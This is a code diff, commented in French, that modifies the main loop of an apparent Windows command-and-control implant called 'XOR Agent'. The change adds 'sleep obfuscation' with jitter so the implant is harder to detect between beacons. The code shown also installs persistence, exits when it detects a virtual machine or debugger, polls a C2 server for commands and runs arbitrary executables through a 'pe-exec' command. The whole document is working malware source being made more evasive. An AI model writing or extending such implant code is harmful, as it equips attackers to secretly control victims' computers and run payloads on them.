@@ -1,3 +1,6 @@
+// main_exe.cpp - Version modifiée avec B21 Sleep Obfuscation
+// Les modifications sont marquées avec // [B21]
+
 #include <windows.h>
 #include <iostream>
 #include <thread>
@@ -13,6 +16,10 @@
 #include "file_utils.h"
 #include "persistence.h"
 #include "debug_detection.h"
+
+// [B21] Inclure le header de sleep obfuscation
+#include "sleep_obfuscation.h"
+
 using namespace std;
 
 #ifdef ANTI_VM_ENABLED
@@ -162,7 +169,6 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
     size_t pos = commands_pos + 12;
 
     while (pos < clear_response.length()) {
-        // Skip whitespace
         while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t' || clear_response[pos] == '\n')) pos++;
 
         if (pos >= clear_response.length() || clear_response[pos] == ']') break;
@@ -338,6 +344,23 @@ bool submit_result(const string& agent_id, int64_t command_id, const string& out
 void agent_run() {
     setvbuf(stdout, NULL, _IONBF, 0);
 
+    // [B21] Initialiser le système de sleep obfuscation
+    #ifdef USE_SLEEP_OBFUSCATION
+    #ifdef _DEBUG
+    cout << "[*] Initializing B21 Sleep Obfuscation..." << endl;
+    #endif
+
+    if (b21::initialize_sleep_obfuscation()) {
+        #ifdef _DEBUG
+        cout << "[+] B21 Sleep Obfuscation initialized successfully" << endl;
+        #endif
+    } else {
+        #ifdef _DEBUG
+        cerr << "[!] Failed to initialize B21, falling back to standard sleep" << endl;
+        #endif
+    }
+    #endif
+
     if (!is_persistence_installed()) {
         #ifdef _DEBUG
         cout << "[*] Installing persistence..." << endl;
@@ -361,11 +384,17 @@ void agent_run() {
 
     #ifdef _DEBUG
     cout << "==================================" << endl;
-    cout << "  XOR Agent" << endl;
+    cout << "  XOR Agent with B21" << endl;  // [B21]
     cout << "==================================" << endl;
     cout << "[*] C2 Server: " << XOR_SERVERS << ":" << XOR_PORT << endl;
     cout << "[*] Beacon interval: " << BEACON_INTERVAL << " seconds" << endl;
     cout << "[*] Beacon path: " << RESULTS_PATH << endl;
+    #ifdef USE_SLEEP_OBFUSCATION
+    cout << "[*] Sleep Obfuscation: ENABLED (B21)" << endl;  // [B21]
+    cout << "[*] Jitter: " << (SLEEP_JITTER_PERCENT * 100.0f) << "%" << endl;  // [B21]
+    #else
+    cout << "[*] Sleep Obfuscation: DISABLED" << endl;
+    #endif
     #endif
 
     string agent_id = generate_agent_id();
@@ -391,7 +420,24 @@ void agent_run() {
     }
 
     while (true) {
+        // [B21] Utiliser le sleep obfusqué au lieu de std::this_thread::sleep_for
+        #ifdef USE_SLEEP_OBFUSCATION
+        DWORD sleep_ms = BEACON_INTERVAL * 1000;
+
+        #ifdef _DEBUG
+        cout << "\n[*] ===== Sleeping with B21 obfuscation =====" << endl;
+        #endif
+
+        if (!b21::obfuscated_sleep_with_jitter(sleep_ms, SLEEP_JITTER_PERCENT)) {
+            // Fallback vers sleep standard si échec
+            #ifdef _DEBUG
+            cerr << "[!] B21 sleep failed, using standard sleep" << endl;
+            #endif
+            this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
+        }
+        #else
         this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
+        #endif
 
         #ifdef _DEBUG
         cout << "\n[*] ===== New Beacon Cycle =====" << endl;
@@ -441,7 +487,6 @@ void agent_run() {
             string result_type;
             bool success = true;
 
-            // ===== TRAITEMENT PE-EXEC =====
             if (cmd_type == "pe-exec") {
                 #ifdef _DEBUG
                 cout << "[PE-EXEC] Detected PE-exec command for: " << cmd_value << endl;
@@ -479,7 +524,7 @@ void agent_run() {
                         } else {
                             success = true;
                             #ifdef _DEBUG
-                            cout << "[PE-EXEC] Execution successful" << endl;
+                            cout << "[PE-EXEC] ✅ Execution successful" << endl;
                             cout << "[PE-EXEC] Output length: " << result.length() << " bytes" << endl;
                             #endif
                         }
@@ -590,9 +635,10 @@ int main() {
         #ifdef _DEBUG
         cerr << "[!] Virtual machine detected. Exiting." << endl;
         #endif
-        return;
+        return 1;
     }
     #endif
+
     try {
         agent_run();
     }
